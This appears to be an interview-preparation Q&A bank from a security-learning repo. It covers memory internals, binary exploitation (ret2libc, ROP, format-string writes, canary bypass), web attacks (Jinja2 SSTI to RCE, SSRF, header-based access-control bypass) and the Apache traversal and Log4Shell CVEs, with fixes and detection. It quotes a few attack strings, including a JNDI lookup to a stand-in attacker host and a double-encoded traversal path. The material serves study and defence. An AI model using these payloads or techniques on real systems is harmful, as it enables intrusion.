# Interview Preparation

A bank of interview questions and answers across the areas in this repo.

## C & memory

**What happens in memory when a function is called?**
A new stack frame is pushed, holding the saved return address, the saved `RBP`, and the function's local variables. Arguments are passed per the calling convention - the first six in registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`), the rest on the stack. On return, `ret` pops the saved return address back into `rip`, and execution continues in the caller.

**What is a double-free, and why is it dangerous?**
Freeing the same chunk twice. It can corrupt the allocator's internal bookkeeping (the free lists), and from there an attacker can make a later `malloc` return a pointer into memory they control. That gives an arbitrary write, which often leads to code execution.

## OS internals

**What is the difference between a process and a thread?**
A process is a unit of execution with its own isolated virtual address space. A thread runs inside a process and shares that address space, the heap and the globals with the other threads - but each thread has its own stack. So communication between threads is cheap, but it requires synchronization to stay correct.

**What is virtual memory, and how does ASLR rely on it?**
Each process sees its own continuous virtual address space, which the MMU maps to physical memory. ASLR builds on that layer: it places segments like the stack, the heap, libc and the PIE base at random addresses on every run, to break exploits that depend on fixed addresses.

**What does NX / DEP do?**
It marks certain pages - such as the stack - as non-executable, so shellcode injected onto the stack cannot run. It is bypassed with code-reuse techniques that use existing executable code instead of injected code, such as ret2libc and ROP.

## Reverse engineering & exploitation

**How would you approach an unknown binary?**
Static first: `file` (stripped? PIE? architecture?), `strings`, the imports, then Ghidra's auto-analysis to find the central function and read its logic. Then dynamic: run it under `gdb`, set breakpoints at the key points, and watch the registers and memory. I alternate between the two - static tells me where to look, dynamic shows what actually happens - until the flow is clear.

**In a stripped binary, how do you find `main`?**
I follow, from `_start`, the first argument passed to `__libc_start_main`: on x86-64 it is loaded into `rdi` just before the call, and that is `main`'s address. It works even when stripped, because `__libc_start_main` stays visible in the dynamic imports - and Ghidra/IDA usually label `main` automatically from this exact pattern. (Stage 02.)

**You want to break on a library function like `strcmp`, but an immediate breakpoint isn't useful - why, and what do you do?**
The dynamic loader resolves and calls functions like `strcmp` many times before my code even starts, so `b strcmp` at launch keeps stopping inside loader code. I run to my own code first - `b *_start` then `entry` (or break on `main`) - and only then set `b strcmp`, once the loader is done. More generally I prefer a route that describes *how* to reach a point over a hardcoded address that breaks on the next build. (Stage 02.)

**How do you find the offset to the return address reliably, and what is the endianness trap?**
I send a `cyclic` pattern; the crash overwrites the return address with a unique 4-byte slice, and `cyclic -l` on that slice gives the offset - measured, not guessed - which I then cross-check against the frame layout (`buffer + saved RBP`). The trap: the value shown next to `ret` is numeric (little-endian), while the string pwndbg shows next to `RSP` is *already* in memory order. Flipping the string by hand searches the wrong bytes and returns a real-but-wrong offset **with no error** - I got 69, 72 and 73, and only 72 was right. The rule: hand `cyclic -l` the full numeric value, or take the stack string as-is, never both. (Stage 03.)

**Explain the ret2libc chain briefly.**
When NX blocks shellcode on the stack, I reuse existing code instead. I leak a libc address at runtime (for example via `puts`), compute the libc base from it, and build a ROP chain that loads `rdi` with a pointer to `"/bin/sh"` (a `pop rdi; ret` gadget) and calls `system`. The leak defeats ASLR; the code reuse defeats NX. (Stage 04.)

**Your ret2win exploit printed the flag but then crashed - why?**
Stack alignment. The System V ABI requires the stack to be 16-byte aligned at a `call`, and glibc's `system` uses `movaps`, which faults on a misaligned stack. Control flow reached `win` (so the flag printed), but the `system("/bin/sh")` after it crashed on the `movaps`. The fix was to prepend a single `ret` gadget, shifting the stack by 8 to restore alignment. The diagnosis is the tell: if the jump had failed, nothing would print - `printf` surviving while `system` died points to something that changed between the two calls, namely alignment. (Stage 03.)

**What does a stack canary actually do, if the overwrite still happens?**
The overflow still writes past the buffer - the canary doesn't prevent it. The compiler puts a random value between the locals and the saved `RBP`/return address and checks it in the function epilogue; if an overflow changed it, `__stack_chk_fail` aborts the program (SIGABRT) before `ret` ever uses the overwritten address. So it *detects*, it doesn't *prevent*. Bypassing it means not corrupting it - leaking the canary and writing it back, or a write that skips over it - not a bigger overflow. (Stage 03.)

**On a small, dynamically-linked no-PIE binary, the classic ret2libc chain can't even start - why?**
Because it has no `pop rdi; ret` gadget. A gadget is just a byte sequence in the executable code - is the two-byte pair `5f c3` - and since x86 can decode a gadget at any offset, the more code a binary has, the more positions that pair can fall in; so in a large or statically-linked binary you can generally expect one to be there. A small dynamically-linked binary can't: it has little code of its own, libc's code lives outside it, and the reliable source small programs used to lean on, `__libc_csu_init`, was removed in glibc 2.34. With no `pop rdi` I can't point `rdi` at `"/bin/sh"`, so `system` has no argument - and the same gap stops ret2csu, ret2dlresolve and a GOT overwrite at the same spot. That single dependency is the "wall". (Stage 04.)

**With NX + ASLR on and no gadget in the binary, how do you get code execution?**
This was a controlled study of the wall, not four exploits of one hardened target, so it's worth being precise about what each assumes. (A), (B) and (C) each change one variable to isolate a mitigation: (A) adds a `pop rdi; ret` back as inline asm, to study the leak/alignment step on its own; (B) rebuilds the binary static - no leak needed, a `.bss` pivot and a raw `execve`, since no-PIE keeps addresses fixed; (C) runs with ASLR off, so libc's own `pop rdi; ret` sits at a fixed address. The one that stands as a real exploit of the untouched hardened binary is (D): it has a genuine format-string bug, which I use to leak a libc pointer at runtime and then do ordinary ret2libc with libc's own gadget - NX and ASLR both on, nothing recompiled. (Stage 04.)

**How do you go from a format-string leak (`%p`) to an arbitrary write (`%n`), and why `%hn` twice?**
`%n` writes the number of characters printed so far, as an int, to an address taken from the argument list. I place the target address inside my own input and use a positional specifier (`%N$n`) to point `%n` at it. Writing a full 4-byte value this way is impractical - it would mean printing ~1.7 billion characters of padding - so I split it into two 2-byte writes with `%hn`, at `target` and `target+2`, and put the addresses at the **end** of the string so their null bytes don't truncate it early. In practice pwntools' `fmtstr_payload` builds this for me. (Stage 05.)

**`None` from `find_gadget` - why isn't it proof the gadget is absent?**
pwntools' `find_gadget` is a chain builder looking for an *exact* match. When I searched for `pop rdi; ret` it returned `None`, but the binary had a **similar but not identical** gadget - `pop rdi; pop rbp; ret` - that does the job with one extra stack slot to fill. I found it with `ROPgadget`, which lists the full catalog. So a negative from a chain builder isn't absence; to claim a gadget truly doesn't exist, I check with a dedicated search tool. (Stage 04.)

## Networking

**Explain the TCP three-way handshake.**
The initiator sends `SYN` with its initial sequence number; the other side answers `SYN/ACK`, acknowledging it and sending its own; the initiator completes with `ACK`. This synchronizes sequence numbers on both sides and sets up a reliable connection before any data moves. It matters for scanning too: a SYN ("half-open") scan sends only the `SYN` and reads the reply - `SYN/ACK` means open, `RST` means closed - without ever completing the connection.

**What is the difference between TCP and UDP, and why does it matter in security?**
TCP is connection-oriented, ordered and reliable - handshake, acknowledgements, retransmission. UDP is connectionless and fast, with no delivery guarantee. In security it changes how you scan (a closed UDP port answers with ICMP "port unreachable", an open one often answers with nothing, so UDP scans are slow and ambiguous), and how traffic leaves a network: DNS over UDP/53 is usually allowed outbound, which makes it a common channel for C2 and exfiltration (DNS tunneling).

## Web

**How do you prevent SQL injection at the code level?**
Prepared statements with bound parameters: the query structure is sent separately from the data, so input is never parsed as SQL. One catch: identifiers - table and column names, `ORDER BY` direction - can't be bound as parameters, so those go through an allowlist of known values. On top of that, least privilege for the database user and input validation as additional layers, not as the main defence.

**How did you identify the template engine and get to RCE without an `import`?**
First, confirm it's server-side template injection and not just reflection: `{{7*7}}` comes back as `49`. Then fingerprint the engine: `{{7*'7'}}` gives `7777777` in Jinja2 (Python string repetition) but `49` in Twig. With Jinja2 confirmed, I can't write `import os`, but I don't need to: every Python object leads back to the class hierarchy. From any object I walk `__class__` → `__mro__` → `object` → `__subclasses__()`, find a class whose `__init__.__globals__` already holds `os` (or reach `subprocess.Popen` directly), and call `popen` from there. The root cause is user input concatenated into the template *source* instead of passed in as a template *variable* - the fix is to pass it as data, not to filter the payload. (Stage 06.)

**The internal admin panel had no authentication - so what protected it, and how did the SSRF get past that?**
Its only protection was network position: it was reachable only from inside, so the app treated "reached us" as "is trusted." The `stockApi` parameter fetched any URL server-side with no validation, which let me issue requests *from* the server's own position - with Burp Intruder I scanned `192.168.0.0/24`, found the admin interface, and deleted a user through it. SSRF turns the server into a proxy, so "reachable only from inside" stops being a boundary at all. Root cause: the server fetches an attacker-controlled URL; fix: validate the resolved destination against internal ranges, and never treat network location as authorization. (Stage 06.)

**Broken access control through `X-Original-URL` - why did no layer actually check?**
Each layer checked a different thing and assumed the other one covered the rest. The front-end proxy enforced the rule on the request line - `GET /` is allowed, so it passed the request on. The back-end framework supports `X-Original-URL` and routes by that header, so it served `/admin`, trusting that anything reaching it had already been authorized. So the path that was authorized and the path that was served were not the same path. The fix: strip the header at the edge, and authorize in the application on the route it actually resolved, not on the path the proxy saw. (Stage 06.)

## Real-world CVE

**How did you identify that `server/util.c` was the vulnerable file?**
By intersecting three sources. The advisory gave me the version and the class of bug - a path-normalization flaw introduced in 2.4.49. Grepping the source for the normalization routine narrowed it to the function that builds the canonical path. The diff between 2.4.49 and the 2.4.50 patch pinpointed it: the changed lines sat in the path-normalization code in `server/util.c`, exactly where the check that should have rejected `../` failed. The diff is the proof - advisory and grep say where to look, the patch says what actually changed. (Stage 07.)

**Why was Apache's first fix (2.4.50) only partial?**
It blocked the single-encoded form but not the double-encoded one. 2.4.49 let `%2e` (an encoded `.`) slip past the traversal check, so `.%2e/` resolved to `../`. 2.4.50 added a check for that, but the decoding still let a double-encoded dot through - `.%%32%65/`, where `%32`→`2` and `%65`→`e`, so one decode pass reads `%2e` and the next reads `.`. It survived the new check and still resolved to `../`. Same traversal, one more layer of encoding - and that gap became CVE-2021-42013, fixed properly in 2.4.51. (Stage 07.)

**Why is removing JNDI in Log4j 2.16 stronger than the allowlist in 2.15?**
2.15 kept the dangerous capability and tried to fence it: JNDI lookups still ran, only restricted to an allowlist of hosts. An allowlist is a filter, and filters get bypassed - which is what happened (CVE-2021-45046). 2.16 removed JNDI lookup support entirely. You can't bypass a capability that isn't there. It's the same principle as the SSTI fix: don't filter the dangerous input, remove the path that makes it dangerous. (Stage 07.)

**How does a defender detect Log4Shell exploitation?**
By the outbound connection, not the inbound string. `${jndi:ldap://attacker/a}` makes the victim server reach *out* - first a DNS lookup for the attacker's domain, then an LDAP/RMI connection to fetch the malicious class. A web server suddenly making outbound DNS/LDAP to an unfamiliar host is the tell, and the attacker can't easily hide it because that callback *is* the exploit. On the inbound side you can also grep logs and request fields - `User-Agent`, other headers, any logged parameter - for `${jndi:`, but egress monitoring catches it even when the string is obfuscated. (Stage 07.)

## Methodology & ethics

**Tell me about a vulnerability you analyzed.** (Almost always asked.)
I walk it as the arc my research journal is built on: hypothesis, static evidence, dynamic evidence, a test that tries to disprove it, conclusion. For the Apache path-traversal CVE that means: the advisory pointed me at the normalization code (hypothesis), the diff showed the exact check that changed (static), I built the vulnerable version and got the file read, then RCE (dynamic), I confirmed the patched version blocks it while the double-encoded form slips the first patch (the refutation test), and the conclusion is what the incomplete fix taught. I keep it on the reasoning and on what surprised me - the writeup holds the full mechanics. (Stages 07-08.)

**You found an unknown vulnerability in a widely-used product. What do you do?**
Responsible disclosure. Report it privately to the vendor with enough detail to reproduce, give them reasonable time to fix, and don't publish details before a patch is out - coordinate the disclosure date with them. I don't exploit it beyond what's needed to prove it, I don't sell it, and I don't test it against systems I'm not authorized to touch. The goal is to get it fixed, not to make noise with it.

**How do you make a finding reproducible - what does `verify.sh` prove?**
Reproducible means someone clones the repo, runs one script, and gets the same result - no reliance on my machine or my memory. `verify.sh` rebuilds the target from source and re-asserts every claim in the writeup. The part that actually matters is that it can *fail*: alongside the positive check (the exploit lands, the flag prints) I build the same target with the mitigation on - a stack canary, say - and assert the exploit now *fails* with `__stack_chk_fail`. A check that can only pass proves nothing; the negative check is what proves the finding is real and not an artifact of my setup. (Stages 01-04, 07.)